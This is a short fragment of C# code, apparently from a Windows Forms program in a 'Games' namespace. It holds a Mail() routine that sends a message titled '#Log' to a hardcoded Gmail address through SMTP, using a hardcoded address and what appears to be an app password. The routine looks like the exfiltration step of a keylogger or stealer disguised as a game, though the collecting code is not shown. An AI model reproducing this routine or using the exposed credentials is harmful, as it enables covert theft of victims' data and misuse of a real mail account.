...
namespace Games
{
    public partial class Form1 : Form
    {
        ...
        void Mail()
        {
            ...
            istemci.Credentials = new System.Net.NetworkCredential("celikzeynep232323@gmail.com", "mepa fbvw ciao btyf");
            istemci.Port = 587;
            ...
            msj.Subject = "#Log";
            msj.From = new MailAddress("celikzeynep232323@gmail.com");
            msj.To.Add("celikzeynep232323@gmail.com");
            try
{
    istemci.Send(msj);
}
